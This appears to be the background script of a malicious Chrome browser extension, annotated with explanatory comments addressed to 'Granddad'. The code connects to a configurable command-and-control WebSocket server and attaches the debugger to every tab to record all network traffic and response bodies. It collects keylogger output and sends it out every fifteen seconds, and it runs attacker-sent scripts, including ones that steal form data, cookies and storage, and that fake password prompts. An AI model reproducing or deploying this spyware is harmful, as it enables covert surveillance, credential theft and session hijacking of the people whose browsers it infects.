// background.js - Definitive final version with corrected startup and debugger logic

// NOTE FOR GRANDDAD: This file is the "brain" of the spy operation. It works silently
// in the background, connecting to the attacker's server, capturing your web traffic,
// and collecting all the information stolen by the other scripts.

importScripts('idb.js');

// --- Configuration ---
const MAX_BODY_BYTES = 1024 * 1024;
const DATA_SEND_INTERVAL = 15000; // NOTE FOR GRANDDAD: Sends stolen data every 15 seconds.
const PING_INTERVAL = 30000;
const KEEPALIVE_ALARM_NAME = 'c2-keepalive';

// --- State Management ---
let dataSendTimer, pingTimer, ws;
let currentConfig = {};
let isConnecting = false;
const pending = new Map();
const MYTHOLOGY_NAMES = ["Zeus", "Hera", "Poseidon", "Demeter", "Ares", "Athena", "Apollo", "Artemis", "Hephaestus", "Aphrodite", "Hermes", "Dionysus", "Hades", "Persephone", "Hestia", "Eros", "Achilles", "Odysseus", "Hercules", "Perseus", "Orpheus", "Prometheus", "Atlas", "Medusa", "Minos"];
const attachedTabs = new Map();

// --- SCRIPT LIBRARY ---
// NOTE FOR GRANDDAD: This is a list of pre-written evil commands the attacker can
// run on any website you visit. For example, #1 steals all form data (like names and
// addresses), and #8 creates fake pop-up boxes to trick you into entering your password.
const SCRIPT_LIBRARY = [
    { id: 1, title: "Extract All Form Data (Sensitive)", script: "return JSON.stringify(Array.from(document.forms).map(form => Object.fromEntries(new FormData(form))))" },
    { id: 2, title: "Dump Session/Local Storage/Cookies", script: "return JSON.stringify({cookies: document.cookie, localStorage: localStorage, sessionStorage: sessionStorage})" },
    { id: 3, title: "Current Page URL & User Agent", script: "return JSON.stringify({url: window.location.href, title: document.title, userAgent: navigator.userAgent})" },
    { id: 4, title: "Click Submit Button", script: "const btn = document.querySelector('button[type=\"submit\"], input[type=\"submit\"], [id*=\"checkout\"], [id*=\"submit\"], [class*=\"submit\"]'); if (btn) { btn.click(); return 'Submit button found and clicked.'; } else { return 'Error: No standard submit button was found.'; }" },
    { id: 5, title: "Force Page Redirection", script: "window.location.href = 'https://www.youtube.com/watch?v=qbWqXKN3m3c';" },
    { id: 6, title: "Count Visible Input Fields", script: "return document.querySelectorAll('input:not([type=\"hidden\"]), textarea').length + ' visible input fields found.';" },
    { id: 7, title: "Scroll to Bottom of Page", script: "window.scrollTo(0, document.body.scrollHeight); return 'Scrolled to bottom of page.';" },
    { id: 8, title: "Dual Prompt Input", script: "document.body.style.filter = 'blur(10px)'; var email = prompt('REMOTE COMMAND: Enter Email:'); var password = prompt('REMOTE COMMAND: Enter Password:'); document.body.style.filter = 'none'; if (email === null || password === null) { return 'User cancelled input.'; } else { return JSON.stringify({email: email, password: password, timestamp: Date.now()}); }" },
    { id: 9, title: "Browser Reconnaissance Data", script: "return JSON.stringify({userAgent: navigator.userAgent, appVersion: navigator.appVersion, appName: navigator.appName, platform: navigator.platform, language: navigator.language, vendor: navigator.vendor, oscpu: navigator.oscpu || 'N/A', isOnline: navigator.onLine, screen: { width: screen.width, height: screen.height }})" },
    { id: 10, title: "Reload Current Page", script: "window.location.reload(); return 'Page Reload Initiated.'" },
    { id: 11, title: "Get Detailed Screen Info", script: "return JSON.stringify({ width: screen.width, height: screen.height, availWidth: screen.availWidth, availHeight: screen.availHeight, colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth });" },
    { id: 12, title: "Generate Canvas Fingerprint ID", script: "const canvas = document.createElement('canvas'); const ctx = canvas.getContext('2d'); const txt = 'BrowserId_g7h3j9d2k_!@#$'; ctx.textBaseline = 'top'; ctx.font = '14px Arial'; ctx.textBaseline = 'alphabetic'; ctx.fillStyle = '#f60'; ctx.fillRect(125,1,62,20); ctx.fillStyle = '#069'; ctx.fillText(txt, 2, 15); ctx.fillStyle = 'rgba(102, 204, 0, 0.7)'; ctx.fillText(txt, 4, 17); return canvas.toDataURL();" },
    { id: 13, title: "FUN: Popup with XSS Demo", script: `const svgString = '<svg width="300" height="150" xmlns="http://www.w3.org/2000/svg"><rect width="100%" height="100%" fill="lightsteelblue"/><text x="50%" y="50%" font-family="Arial" font-size="24" font-weight="bold" fill="darkslateblue" text-anchor="middle" dominant-baseline="middle">You are bruised!</text></svg>'; const overlay = document.createElement('div'); overlay.style.cssText = 'position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); padding:20px; background:white; border:2px solid black; box-shadow:0 0 15px rgba(0,0,0,0.5); z-index:100000; text-align:center;'; overlay.innerHTML = '<img src="data:image/svg+xml;base64,' + btoa(svgString) + '"><br/><br/><button onclick="alert(1); this.parentElement.remove()">Close</button>'; document.body.appendChild(overlay); return 'XSS demo deployed. Click the close button to trigger the alert.';` }
];

// --- Helper Functions ---
function makeId() { return `${Date.now()}-${Math.random().toString(16).slice(2, 10)}`; }
function getOrCreateDeviceName(config) { if (config.deviceName) return config.deviceName; const name = MYTHOLOGY_NAMES[Math.floor(Math.random() * MYTHOLOGY_NAMES.length)]; const uniqueName = `${name}-${Math.floor(Math.random() * 1000).toString().padStart(3, '0')}`; chrome.storage.local.set({ deviceName: uniqueName }); return uniqueName; }

// --- Core Logic: Data Exfiltration ---
// NOTE FOR GRANDDAD: This function is responsible for sending all the stolen data
// (your typed keys and browsing history) back to the attacker's server.
async function sendDataBatch() { if (ws?.readyState !== WebSocket.OPEN) return; const [networkEntries, keyLogs] = await Promise.all([ getAndDeleteAllEntries(), getAndDeleteAllKeyLogs() ]); if (networkEntries.length === 0 && keyLogs.length === 0) return; const payload = { type: 'DATA_INGEST', deviceName: currentConfig.deviceName, timestamp: Date.now(), data: { network: networkEntries, keystrokes: keyLogs } }; ws.send(JSON.stringify(payload)); }

// --- Core Logic: C2 Connection ---
// NOTE FOR GRANDDAD: This function sets up the secret connection to the attacker's
// "Command and Control" (C2) server. This is how data is sent out and how
// commands are received.
function setupWebSocket() {
    if (ws && ws.readyState < 2) return;
    if (isConnecting) return;
    const { deviceName, wsUrl } = currentConfig;
    if (!wsUrl || !deviceName) { console.warn("[C2 Agent] Config not ready, connection delayed."); return; }
    isConnecting = true;
    try { ws = new WebSocket(wsUrl); } catch (e) { isConnecting = false; return; }
    ws.onopen = () => { isConnecting = false; console.log('[C2 Agent] WebSocket connected.'); ws.send(JSON.stringify({ type: 'REGISTER', deviceName, timestamp: Date.now() })); if (pingTimer) clearInterval(pingTimer); if (dataSendTimer) clearInterval(dataSendTimer); pingTimer = setInterval(() => { if (ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify({ type: 'PING', timestamp: Date.now() })); }, PING_INTERVAL); dataSendTimer = setInterval(sendDataBatch, DATA_SEND_INTERVAL); sendDataBatch(); };
    ws.onmessage = async (event) => {
        try {
            const msg = JSON.parse(event.data);
            if (msg.type === 'PONG') return;
            // NOTE FOR GRANDDAD: This part listens for commands from the attacker.
            // When a "COMMAND_RUN_SCRIPT" message arrives, it tells the browser
            // to execute the attacker's malicious code on the active website.
            if (msg.type === 'COMMAND_RUN_SCRIPT') {
                const tabs = await chrome.tabs.query({ active: true, currentWindow: true });
                if (tabs.length > 0) { handleRunScriptCommand({ ...msg, tabId: tabs[0].id }); } else { sendScriptResult(msg.commandId, "Error: No active tab found.", true); }
            }
        } catch (e) { console.error("[C2 Agent] Error processing command:", e); }
    };
    ws.onclose = () => { isConnecting = false; if (pingTimer) clearInterval(pingTimer); if (dataSendTimer) clearInterval(dataSendTimer); console.log('[C2 Agent] WebSocket closed.'); };
    ws.onerror = (err) => { console.error('[C2 Agent] WebSocket error:', err); ws.close(); };
}

// --- Core Logic: Remote Script Execution ---
// NOTE FOR GRANDDAD: This function takes a command from the attacker and forces
// the web page you're currently on to run it. This is how they can steal info
// directly from the page or change what you see.
async function handleRunScriptCommand(cmd) { const { script, commandId, tabId } = cmd; try { await chrome.scripting.executeScript({ target: { tabId, allFrames: false }, files: ['main_world_executor.js'], world: 'MAIN' }); const response = await chrome.tabs.sendMessage(tabId, { type: 'EXECUTE_PAYLOAD', payload: script }); if (response.error) { throw new Error(response.error); } sendScriptResult(commandId, response.result || "Script executed without return value.", false); } catch (e) { sendScriptResult(commandId, `Execution Failed: ${e.message}`, true); } }
function sendScriptResult(commandId, resultText, isError) { if (ws?.readyState === WebSocket.OPEN) { ws.send(JSON.stringify({ type: 'SCRIPT_RESULT', deviceName: currentConfig.deviceName, commandId, isError, result: resultText, timestamp: Date.now() })); } }

// NOTE FOR GRANDDAD: This line listens for the messages from the keylogger (content.js)
// and tells the database script (idb.js) to save the stolen keystrokes.
chrome.runtime.onMessage.addListener((msg) => { if (msg?.type === 'keylog') addKeyLog(msg.data).catch(console.error); return true; });

// --- Definitive Startup and Initialization Logic ---
async function initialize() {
    console.log("[C2 Agent] Initializing...");
    const result = await chrome.storage.local.get(['deviceName']);
    // NOTE FOR GRANDDAD: This is the web address of the attacker's server.
    // All of the stolen data is sent to this address.
    currentConfig = {
        wsUrl: `wss://YOUR-C2-URL.onrender.com/agent-ws`, // <-- EDIT THIS LINE
        deviceName: getOrCreateDeviceName(result)
    };
    setupWebSocket();
    await attachToAllTabs();
}

chrome.runtime.onInstalled.addListener(() => {
    console.log("[C2 Agent] onInstalled event fired.");
    chrome.alarms.create(KEEPALIVE_ALARM_NAME, {
        delayInMinutes: 1,
        periodInMinutes: 1
    });
    initialize();
});

chrome.runtime.onStartup.addListener(() => {
    console.log("[C2 Agent] onStartup event fired.");
    initialize();
});

chrome.alarms.onAlarm.addListener(async (alarm) => {
    if (alarm.name === KEEPALIVE_ALARM_NAME) {
        if (!currentConfig.wsUrl) {
            await initialize();
        } else {
            setupWebSocket();
        }
    }
});

// --- Definitive Network Capture Logic ---
// NOTE FOR GRANDDAD: This section uses the dangerous "debugger" permission to
// attach a spy to every website tab you open.
async function attachToAllTabs() {
    try {
        const tabs = await chrome.tabs.query({ url: ["http://*/*", "https://*/*"] });
        for (const tab of tabs) {
            await attachDebugger(tab.id);
        }
    } catch (e) { console.warn("Could not query tabs on startup:", e.message); }
}

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === 'complete' && tab.url && tab.url.startsWith('http')) {
        attachDebugger(tabId);
    }
});

async function attachDebugger(tabId) {
    if (attachedTabs.has(tabId)) return;
    try {
        await chrome.debugger.attach({ tabId }, '1.3');
        attachedTabs.set(tabId, '1.3');
        // NOTE FOR GRANDDAD: This command tells the browser to start reporting
        // all network activity for that tab to this spy program.
        await chrome.debugger.sendCommand({ tabId }, 'Network.enable');
    } catch (e) { console.warn(`Could not attach debugger to tab ${tabId}:`, e.message); }
}

// NOTE FOR GRANDDAD: This function is the wiretap itself. It's called for every
// single piece of data your browser sends or receives, like images, text, and form
// submissions. It records the details of all this traffic.
chrome.debugger.onEvent.addListener(async (source, method, params) => {
    const tabId = source.tabId;
    if (!tabId) return;

    if (method === 'Network.requestWillBeSent') {
        const { requestId, request } = params;
        if (!request.url.startsWith('http')) return;
        
        const entry = {
            id: makeId(),
            timestamp: Date.now(),
            request: { url: request.url, method: request.method, headers: Object.entries(request.headers).map(([name, value]) => ({ name, value })), body: request.hasPostData ? { text: request.postData } : null, tabId, },
            response: null
        };
        pending.set(requestId, entry);
    }

    if (method === 'Network.responseReceived') {
        const { requestId, response } = params;
        const entry = pending.get(requestId);
        if (entry) {
            entry.response = { statusCode: response.status, statusLine: response.statusText, headers: Object.entries(response.headers).map(([name, value]) => ({ name, value })) };
        }
    }

    if (method === 'Network.loadingFinished') {
        const { requestId } = params;
        const entry = pending.get(requestId);
        if (entry && entry.response) {
            try {
                // NOTE FOR GRANDDAD: This part even tries to capture the actual content
                // of the data being sent and received, such as the text on a webpage.
                const responseBody = await chrome.debugger.sendCommand({ tabId }, 'Network.getResponseBody', { requestId });
                entry.response.body = responseBody.body;
                entry.response.bodyEncoding = responseBody.base64Encoded ? 'base64' : 'utf8';
                if (entry.response.body?.length > MAX_BODY_BYTES) {
                    entry.response.body = entry.response.body.slice(0, MAX_BODY_BYTES);
                    entry.response._bodyTruncated = true;
                }
            } catch (e) {
                entry.response._bodyFetchError = e.message || 'Could not capture body.';
            }
            await addEntry(entry);
            pending.delete(requestId);
        }
    }

    if (method === 'Network.loadingFailed') {
        const { requestId, errorText } = params;
        const entry = pending.get(requestId);
        if (entry) {
            entry.response = entry.response || {};
            entry.response.error = errorText;
            entry.response.statusCode = 'ERR';
            await addEntry(entry);
            pending.delete(requestId);
        }
    }
});

chrome.debugger.onDetach.addListener((source) => {
    attachedTabs.delete(source.tabId);
});